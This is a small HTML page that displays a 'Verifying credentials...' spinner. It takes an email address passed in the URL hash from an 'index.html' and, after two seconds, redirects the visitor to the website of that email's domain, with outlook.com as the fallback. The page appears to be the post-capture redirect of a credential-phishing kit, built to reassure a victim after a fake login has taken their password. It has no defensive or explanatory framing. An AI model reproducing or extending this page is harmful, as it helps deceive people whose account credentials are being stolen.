<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script>
        window.onload = function() {
            // Get the email passed from index.html
            var hash = window.location.hash.substr(1);
            if (hash && hash.includes("@")) {
                var domain = hash.split("@")[1];
                
                // Wait 2 seconds, then go to the final destination
                setTimeout(function() {
                    window.location.href = "https://www." + domain;
                }, 2000);
            } else {
                // Fallback if something goes wrong
                window.location.href = "https://www.outlook.com";
            }
        };
    </script>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #ffffff; margin: 0; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="spinner" style="margin: 0 auto 20px;"></div>
        <p>Verifying credentials...</p>
    </div>
</body>
</html>
